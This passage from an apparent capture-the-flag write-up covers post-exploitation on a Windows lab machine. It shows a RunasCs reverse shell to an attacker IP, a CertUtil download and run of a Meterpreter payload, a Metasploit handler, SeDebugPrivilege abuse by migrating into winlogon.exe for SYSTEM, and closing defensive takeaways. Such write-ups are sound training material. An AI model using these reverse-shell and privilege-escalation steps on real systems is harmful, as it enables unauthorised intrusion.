RunasCs was used to spawn a reverse shell as the `alaading` user.
```
.\RunasCs.exe alaading f8g<REDACTED> cmd.exe -r 10.10.16.25:444
```

**15. User Flag Retrieval**  
Once connected as `alaading`, the user flag was retrieved.
```bash 
❯ rlwrap -cAr nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.129.24.111 49681
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>.\RunasCs.exe alaading f8g<REDACTED> cmd.exe -r 10.10.16.25:444
.\RunasCs.exe alaading f8g<REDACTED> cmd.exe -r 10.10.16.25:444
'.\RunasCs.exe' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>whoami
whoami
pov\alaading

C:\Windows\system32>cd c:\Users\alaadin
cd c:\Users\alaadin
The system cannot find the path specified.

C:\Windows\system32>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>cd c:\users
cd c:\users

c:\Users>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0899-6CAF

 Directory of c:\Users

10/26/2023  04:02 PM    <DIR>          .
10/26/2023  04:02 PM    <DIR>          ..
10/26/2023  03:31 PM    <DIR>          .NET v4.5
10/26/2023  03:31 PM    <DIR>          .NET v4.5 Classic
10/26/2023  03:21 PM    <DIR>          Administrator
10/26/2023  03:57 PM    <DIR>          alaading
10/26/2023  01:02 PM    <DIR>          Public
12/25/2023  02:24 PM    <DIR>          sfitz
               0 File(s)              0 bytes
               8 Dir(s)   7,352,791,040 bytes free

c:\Users>cd alaadin
cd alaadin
The system cannot find the path specified.

c:\Users>cd alaading
cd alaading

c:\Users\alaading>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0899-6CAF

 Directory of c:\Users\alaading

10/26/2023  03:57 PM    <DIR>          .
10/26/2023  03:57 PM    <DIR>          ..
10/26/2023  03:57 PM    <DIR>          3D Objects
10/26/2023  03:57 PM    <DIR>          Contacts
01/11/2024  06:43 AM    <DIR>          Desktop
12/25/2023  01:45 PM    <DIR>          Documents
10/26/2023  03:57 PM    <DIR>          Downloads
10/26/2023  03:57 PM    <DIR>          Favorites
10/26/2023  03:57 PM    <DIR>          Links
10/26/2023  03:57 PM    <DIR>          Music
10/26/2023  03:57 PM    <DIR>          Pictures
10/26/2023  03:57 PM    <DIR>          Saved Games
10/26/2023  03:57 PM    <DIR>          Searches
10/26/2023  03:57 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   7,352,791,040 bytes free

c:\Users\alaading>cd Desktop
cd Desktop

c:\Users\alaading\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0899-6CAF

 Directory of c:\Users\alaading\Desktop

01/11/2024  06:43 AM    <DIR>          .
01/11/2024  06:43 AM    <DIR>          ..
11/19/2025  03:21 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,352,791,040 bytes free

c:\Users\alaading\Desktop>type user.txt
type user.txt
<REDACTED>

c:\Users\alaading\Desktop>

```



**16. Privilege Enumeration**  
The user's privileges were checked to identify potential escalation paths.
```bash 

c:\Users\alaading\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
**Findings:** The user `alaading` had `SeDebugPrivilege` enabled, which allows debugging and migrating into processes running as higher-privileged users.

**17. Meterpreter Payload Transfer**  
A Meterpreter reverse shell payload was downloaded to the target.

```powershell
c:\Users\alaading\Desktop>cd c:\programdata
cd c:\programdata

c:\ProgramData>CertUtil -URLCache -split -f http://10.10.16.25/rev.exe rev.exe
CertUtil -URLCache -split -f http://10.10.16.25/rev.exe rev.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.

c:\ProgramData>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

c:\ProgramData>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0899-6CAF

 Directory of c:\ProgramData

10/26/2023  01:04 PM    <DIR>          Package Cache
10/26/2023  02:07 PM    <DIR>          regid.1991-06.com.microsoft
11/19/2025  04:11 AM             7,168 rev.exe
11/19/2025  03:57 AM            51,712 RunasCs.exe
09/14/2018  11:19 PM    <DIR>          SoftwareDistribution
11/05/2022  11:03 AM    <DIR>          ssh
09/14/2018  11:19 PM    <DIR>          USOPrivate
11/05/2022  11:03 AM    <DIR>          USOShared
10/26/2023  01:04 PM    <DIR>          VMware
               2 File(s)         58,880 bytes
               7 Dir(s)   7,351,320,576 bytes free

c:\ProgramData>.\rev.exe
.\rev.exe

c:\ProgramData>
```


**18. Process Migration**  
The Meterpreter session was used to identify a SYSTEM-level process and migrate into it.
```bash

[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >>  set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 9002
LPORT => 9002
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.16.25:9002
[*] Sending stage (203846 bytes) to 10.129.24.111
[*] Meterpreter session 1 opened (10.10.16.25:9002 -> 10.129.24.111:49684) at 2025-11-19 19:12:59 +0700

(Meterpreter 1)(c:\ProgramData) > ps winlogon
Filtering on 'winlogon'

Process List
============

 PID  PPID  Name          Arch  Session  User  Path
 ---  ----  ----          ----  -------  ----  ----
 548  472   winlogon.exe  x64   1              C:\Windows\System32\winlogon.exe

(Meterpreter 1)(c:\ProgramData) > migrate 548
[*] Migrating from 3916 to 548...
[*] Migration completed successfully.
(Meterpreter 1)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 1)(C:\Windows\system32) > cd c:\users\administrator\desktop
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
```
**Findings:** Successfully migrated into `winlogon.exe` (PID 548), achieving `NT AUTHORITY\SYSTEM` privileges.

### Phase 7: Root Flag Retrieval

**19. Root Flag**  
With SYSTEM access achieved, the root flag was retrieved from the Administrator's desktop.
```powershell
(Meterpreter 1)(C:\Windows\system32) > shell
Process 1868 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\users\administrator\desktop
cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0899-6CAF

 Directory of c:\Users\Administrator\Desktop

01/15/2024  04:11 AM    <DIR>          .
01/15/2024  04:11 AM    <DIR>          ..
11/19/2025  03:21 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,348,056,064 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
<REDACTED>

c:\Users\Administrator\Desktop>
```

## Key Takeaways

- **Subdomain Enumeration:** Always enumerate subdomains as they often host development or staging environments with additional vulnerabilities.
    
- **LFI Risks:** File download functionalities must properly validate and sanitize user input to prevent path traversal attacks.
    
- **Machine Key Protection:** [ASP.NET](https://ASP.NET) machine keys are critical secrets that must never be exposed. They can lead to full RCE via ViewState deserialization.
    
- **Secure Credential Storage:** PowerShell credential files (.xml) can be easily decrypted if obtained. Avoid storing credentials on disk.
    
- **SeDebugPrivilege Abuse:** Users with SeDebugPrivilege can escalate to SYSTEM by migrating into privileged processes. This privilege should be strictly controlled.
    
- **Defense in Depth:** Multiple layers of security are necessary as single misconfigurations can be chained together for complete compromise.
    
